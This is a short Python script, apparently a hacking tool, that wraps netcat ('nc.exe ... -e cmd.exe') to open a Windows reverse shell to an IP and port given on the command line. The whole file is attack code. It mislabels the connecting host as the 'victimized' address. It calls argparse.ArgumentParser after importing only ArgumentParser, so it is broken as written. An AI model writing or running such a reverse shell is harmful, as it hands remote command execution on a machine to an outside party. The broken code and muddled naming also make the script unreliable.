# define a class to connect a computer and create a reverse shell using netcat nc.exe

from argparse import ArgumentParser
import os

# define a class to connect a computer and create a reverse shell using netcat nc.exe


class ReverseShell:
    def __init__(self, victimized_ip, victimized_port=4444):
        self.victimized_ip = victimized_ip
        self.victimized_port = victimized_port

    def connect(self):
        command = "nc.exe {victimized_ip} {victimized_port} -e cmd.exe".format(
            victimized_ip=self.victimized_ip, victimized_port=self.victimized_port)
        os.system(command)


def main():
    # parse the arguments
    parser = argparse.ArgumentParser(description="Create a reverse shell using netcat.exe")
    parser.add_argument("-t", "--target", required=True,
                        help="victimized IP address", dest="victimized_ip")
    parser.add_argument("-p", "--port", help="victimized port",
                        dest="victimized_port", default="4444")

    args = parser.parse_args()

    # create an object and connect to the remote computer
    rs = ReverseShell(args.victimized_ip, args.victimized_port)
    rs.connect()


if __name__ == '__main__':
    main()